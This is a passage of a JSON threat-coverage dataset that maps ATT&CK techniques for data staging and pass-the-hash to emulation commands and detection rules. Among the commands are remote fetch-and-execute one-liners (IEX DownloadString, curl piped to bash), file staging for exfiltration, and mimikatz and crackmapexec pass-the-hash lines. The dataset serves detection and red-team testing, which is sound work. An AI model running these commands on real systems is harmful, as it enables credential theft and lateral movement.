'^(?:.*(?=.*.*\\\\GUP\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*C:\\\\Users\\\\\\\\.*\\\\AppData\\\\Local\\\\Notepad\\\\+\\\\+\\\\updater\\\\gup\\\\.exe|.*C:\\\\Users\\\\\\\\.*\\\\AppData\\\\Roaming\\\\Notepad\\\\+\\\\+\\\\updater\\\\gup\\\\.exe|.*C:\\\\Program Files\\\\Notepad\\\\+\\\\+\\\\updater\\\\gup\\\\.exe|.*C:\\\\Program Files \\\\(x86\\\\)\\\\Notepad\\\\+\\\\+\\\\updater\\\\gup\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1074/T1074.yaml", "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat') > pi.log\n", "name": null}, {"source": "atomics/T1074/T1074.yaml", "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/discovery.log\n", "name": null}, {"source": "atomics/T1074/T1074.yaml", "command": "Compress-Archive -Path $PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip\n", "name": null}, {"source": "data/abilities/collection/4e97e699-93d7-4040-b5a3-2e906a58199e.yml", "command": {"windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}, "darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}}, "name": "copy files to staging directory"}, {"source": "data/abilities/collection/6469befa-748a-4b9c-a96d-f191fde47d89.yml", "command": {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Path \"staged\" -recurse\n", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "darwin": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "name": "create a directory for exfil staging"}], "command_list": ["IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat') > pi.log\n", "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/discovery.log\n", "Compress-Archive -Path $PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip\n", {"windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}, "darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}}, {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Path \"staged\" -recurse\n", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "darwin": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}], "technique_id": "T1074", "parsed_datasets": [{"Atomic Red Team Test - Data Staged": {"display_name": "Data Staged", "atomic_tests": [{"description": "Utilize powershell to download discovery.bat and save to a local file\n", "supported_platforms": ["windows"], "name": "Stage data from Discovery.bat", "executor": {"elevation_required": false, "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat') > pi.log\n", "name": "powershell"}}, {"description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n", "supported_platforms": ["linux", "macos"], "name": "Stage data from Discovery.sh", "executor": {"command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/discovery.log\n", "name": "bash"}}, {"description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration.\n", "supported_platforms": ["windows"], "name": "Zip a Folder with PowerShell for Staging in Temp", "executor": {"elevation_required": false, "command": "Compress-Archive -Path $PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip\n", "name": "powershell", "cleanup_command": "Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore\n"}}], "attack_technique": "T1074"}}, {"Mitre Stockpile - copy files to staging directory": {"platforms": {"windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}, "darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.file.path"}]}, {"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.staged"}]}], "description": "copy files to staging directory", "tactic": "collection", "technique": {"attack_id": "T1074", "name": "Data Staged"}, "id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "name": "Stage sensitive files"}}, {"Mitre Stockpile - create a directory for exfil staging": {"platforms": {"windows": {"psh,pwsh": {"cleanup": "Remove-Item -Path \"staged\" -recurse\n", "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "darwin": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"cleanup": "rm -rf staged\n", "command": "mkdir -p staged && echo $PWD/staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "description": "create a directory for exfil staging", "tactic": "collection", "technique": {"attack_id": "T1074", "name": "Data Staged"}, "id": "6469befa-748a-4b9c-a96d-f191fde47d89", "name": "Create staging directory"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_command_line contains \"DownloadString\"and process_command_line contains \"Net.WebClient\")or (process_command_line contains \"New-Object\"and process_command_line contains \"IEX\")", "product": "Azure Sentinel", "name": "Datal Staged Process"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}\n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec atomic.local -u Administrator -H #{ntlm} -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command} \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x whoami \n", "name": null}, {"source": "atomics/T1075/T1075.yaml", "command": "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/pth", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/pth", "name": "Empire Module Command"}], "command_list": ["mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}\n", "mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a\n", "mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}\n", "crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command} \n", "crackmapexec atomic.local -u Administrator -H #{ntlm} -x #{command} \n", "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command} \n", "crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x whoami \n", "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n", "powershell/credentials/mimikatz/pth", "powershell/credentials/mimikatz/pth"], "technique_id": "T1075", "parsed_datasets": [{"Atomic Red Team Test - Pass the Hash": {"display_name": "Pass the Hash", "atomic_tests": [{"description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n", "supported_platforms": ["windows"], "name": "Mimikatz Pass the Hash", "input_arguments": {"domain": {"default": "atomic.local", "type": "string", "description": "domain"}, "ntlm": {"default": "cc36cf7a8514893efccd3324464tkg1a", "type": "string", "description": "ntlm hash"}, "user_name": {"default": "Administrator", "type": "string", "description": "username"}}, "executor": {"command": "mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\n", "name": "command_prompt"}}, {"dependencies": [{"description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n", "get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n", "prereq_command": "if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }\n"}], "supported_platforms": ["windows"], "name": "crackmapexec Pass the Hash", "executor": {"elevation_required": false, "command": "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} \n", "name": "command_prompt"}, "description": "command execute with crackmapexec\n", "input_arguments": {"user_name": {"default": "Administrator", "type": "string", "description": "username"}, "domain": {"default": "atomic.local", "type": "string", "description": "domain"}, "ntlm": {"default": "cc36cf7a8514893efccd3324464tkg1a", "type": "string", "description": "command"}, "command": {"default": "whoami", "type": "string", "description": "command to execute"}, "crackmapexec_exe": {"default": "C:\\CrackMapExecWin\\crackmapexec.exe", "type": "Path", "description": "crackmapexec windows executable"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1075"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1075", "Empire Module": "powershell/credentials/mimikatz/pth", "Technique": "Pass the Hash", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/pth\":  [\"T1075\"],"}}], "queries": [{"query": "title: Successful Overpass the Hash Attempt\nid: 192a0330-c20b-4356-90b6-7b7049ae0b87\nstatus: experimental\ndescription: Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.\nreferences:\n    - https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html\nauthor: Roberto Rodriguez (source), Dominik Schaudel (rule)\ndate: 2018/02/12\ntags:\n    - attack.lateral_movement\n    - attack.t1075\n    - attack.s0002\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        LogonProcessName: seclogo\n        AuthenticationPackageName: Negotiate\n    condition: selection\nfalsepositives:\n    - Runas command-line tool using /netonly parameter\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Successful Overpass the Hash Attempt\nid: 192a0330-c20b-4356-90b6-7b7049ae0b87\nstatus: experimental\ndescription: Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.\nreferences:\n    - https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html\nauthor: Roberto Rodriguez (source), Dominik Schaudel (rule)\ndate: 2018/02/12\ntags:\n    - attack.lateral_movement\n    - attack.t1075\n    - attack.s0002\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        LogonProcessName: seclogo\n        AuthenticationPackageName: Negotiate\n    condition: selection\nfalsepositives:\n    - Runas command-line tool using /netonly parameter\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4624\" AND LogonType:\"9\" AND LogonProcessName:\"seclogo\" AND AuthenticationPackageName:\"Negotiate\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Successful-Overpass-the-Hash-Attempt <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Successful Overpass the Hash Attempt\",\\n    \"description\": \"Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz\\'s sekurlsa::pth module.\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1075\",\\n      \"attack.s0002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"9\\\\\" AND LogonProcessName:\\\\\"seclogo\\\\\" AND AuthenticationPackageName:\\\\\"Negotiate\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4624\\\\\" AND LogonType:\\\\\"9\\\\\" AND LogonProcessName:\\\\\"seclogo\\\\\" AND AuthenticationPackageName:\\\\\"Negotiate\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Successful Overpass the Hash Attempt\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4624\" AND LogonType:\"9\" AND LogonProcessName:\"seclogo\" AND AuthenticationPackageName:\"Negotiate\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4624\" LogonType=\"9\" LogonProcessName=\"seclogo\" AuthenticationPackageName=\"Negotiate\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4624\" logon_type=\"9\" logon_process=\"seclogo\" AuthenticationPackageName=\"Negotiate\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4624)(?=.*9)(?=.*seclogo)(?=.*Negotiate))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Pass the Hash Activity\nid: f8d98d6c-7a07-4d74-b064-dd4a3c244528\nstatus: experimental\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\nauthor: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)\ntags:\n    - attack.lateral_movement\n    - attack.t1075\n    - car.2016-04-004\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        - EventID: 4624\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n        - EventID: 4625\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Pass the Hash Activity\nid: f8d98d6c-7a07-4d74-b064-dd4a3c244528\nstatus: experimental\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\nauthor: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method)\ntags:\n    - attack.lateral_movement\n    - attack.t1075\n    - car.2016-04-004\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        - EventID: 4624\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n        - EventID: 4625\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          WorkstationName: '%Workstations%'\n          ComputerName: '%Workstations%'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((LogonType:\"3\" AND LogonProcessName:\"NtLmSsp\" AND WorkstationName:\"%Workstations%\" AND ComputerName:\"%Workstations%\" AND (EventID:\"4624\" OR EventID:\"4625\")) AND (NOT (AccountName:\"ANONYMOUS\\\\ LOGON\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Pass-the-Hash-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Pass the Hash Activity\",\\n    \"description\": \"Detects the attack technique pass the hash which is used to move laterally inside the network\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1075\",\\n      \"car.2016-04-004\"\\n    ],\\n    \"query\": \"((LogonType:\\\\\"3\\\\\" AND LogonProcessName:\\\\\"NtLmSsp\\\\\" AND WorkstationName:\\\\\"%Workstations%\\\\\" AND ComputerName:\\\\\"%Workstations%\\\\\" AND (EventID:\\\\\"4624\\\\\" OR EventID:\\\\\"4625\\\\\")) AND (NOT (AccountName:\\\\\"ANONYMOUS\\\\\\\\ LOGON\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((LogonType:\\\\\"3\\\\\" AND LogonProcessName:\\\\\"NtLmSsp\\\\\" AND WorkstationName:\\\\\"%Workstations%\\\\\" AND ComputerName:\\\\\"%Workstations%\\\\\" AND (EventID:\\\\\"4624\\\\\" OR EventID:\\\\\"4625\\\\\")) AND (NOT (AccountName:\\\\\"ANONYMOUS\\\\\\\\ LOGON\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Pass the Hash Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((LogonType:\"3\" AND LogonProcessName:\"NtLmSsp\" AND WorkstationName:\"%Workstations%\" AND ComputerName:\"%Workstations%\" AND (EventID:\"4624\" OR EventID:\"4625\")) AND (NOT (AccountName:\"ANONYMOUS LOGON\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((LogonType=\"3\" LogonProcessName=\"NtLmSsp\" WorkstationName=\"%Workstations%\" ComputerName=\"%Workstations%\" (EventID=\"4624\" OR EventID=\"4625\")) NOT (AccountName=\"ANONYMOUS LOGON\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (logon_type=\"3\" logon_process=\"NtLmSsp\" WorkstationName=\"%Workstations%\" ComputerName=\"%Workstations%\" (event_id=\"4624\" OR event_id=\"4625\"))  -(AccountName=\"ANONYMOUS LOGON\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*NtLmSsp)(?=.*%Workstations%)(?=.*%Workstations%)(?=.*(?:.*(?:.*4624|.*4625)))))(?=.*(?!.*(?:.*(?=.*ANONYMOUS LOGON)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Pass the Hash Activity 2\nid: 8eef149c-bd26-49f2-9e5a-9b00e3af499b\nstatus: production\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\n    - https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis\n    - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/\nauthor: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)\ntags:\n    - attack.lateral_movement\n    - attack.t1075\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624\ndetection:\n    selection:\n        - EventID: 4624\n          SubjectUserSid: 'S-1-0-0'\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          KeyLength: '0'\n        - EventID: 4624\n          LogonType: '9'\n          LogonProcessName: 'seclogo'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Pass the Hash Activity 2\nid: 8eef149c-bd26-49f2-9e5a-9b00e3af499b\nstatus: production\ndescription: Detects the attack technique pass the hash which is used to move laterally inside the network\nreferences:\n    - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events\n    - https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis\n    - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/\nauthor: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule)\ntags:\n    - attack.lateral_movement\n    - attack.t1075\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624\ndetection:\n    selection:\n        - EventID: 4624\n          SubjectUserSid: 'S-1-0-0'\n          LogonType: '3'\n          LogonProcessName: 'NtLmSsp'\n          KeyLength: '0'\n        - EventID: 4624\n          LogonType: '9'\n          LogonProcessName: 'seclogo'\n    filter:\n        AccountName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\n    - Penetration tests\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4624\" AND ((SubjectUserSid:\"S\\\\-1\\\\-0\\\\-0\" AND LogonType:\"3\" AND LogonProcessName:\"NtLmSsp\" AND KeyLength:\"0\") OR (LogonType:\"9\" AND LogonProcessName:\"seclogo\"))) AND (NOT (AccountName:\"ANONYMOUS\\\\ LOGON\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Pass-the-Hash-Activity-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Pass the Hash Activity 2\",\\n    \"description\": \"Detects the attack technique pass the hash which is used to move laterally inside the network\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1075\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4624\\\\\" AND ((SubjectUserSid:\\\\\"S\\\\\\\\-1\\\\\\\\-0\\\\\\\\-0\\\\\" AND LogonType:\\\\\"3\\\\\" AND LogonProcessName:\\\\\"NtLmSsp\\\\\" AND KeyLength:\\\\\"0\\\\\") OR (LogonType:\\\\\"9\\\\\" AND LogonProcessName:\\\\\"seclogo\\\\\"))) AND (NOT (AccountName:\\\\\"ANONYMOUS\\\\\\\\ LOGON\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4624\\\\\" AND ((SubjectUserSid:\\\\\"S\\\\\\\\-1\\\\\\\\-0\\\\\\\\-0\\\\\" AND LogonType:\\\\\"3\\\\\" AND LogonProcessName:\\\\\"NtLmSsp\\\\\" AND KeyLength:\\\\\"0\\\\\") OR (LogonType:\\\\\"9\\\\\" AND LogonProcessName:\\\\\"seclogo\\\\\"))) AND (NOT (AccountName:\\\\\"ANONYMOUS\\\\\\\\ LOGON\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Pass the Hash Activity 2\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4624\" AND ((SubjectUserSid:\"S\\\\-1\\\\-0\\\\-0\" AND LogonType:\"3\" AND LogonProcessName:\"NtLmSsp\" AND KeyLength:\"0\") OR (LogonType:\"9\" AND LogonProcessName:\"seclogo\"))) AND (NOT (AccountName:\"ANONYMOUS LOGON\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4624\" ((SubjectUserSid=\"S-1-0-0\" LogonType=\"3\" LogonProcessName=\"NtLmSsp\" KeyLength=\"0\") OR (LogonType=\"9\" LogonProcessName=\"seclogo\"))) NOT (AccountName=\"ANONYMOUS LOGON\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"4624\" ((SubjectUserSid=\"S-1-0-0\" logon_type=\"3\" logon_process=\"NtLmSsp\" key_length=\"0\") OR (logon_type=\"9\" logon_process=\"seclogo\")))  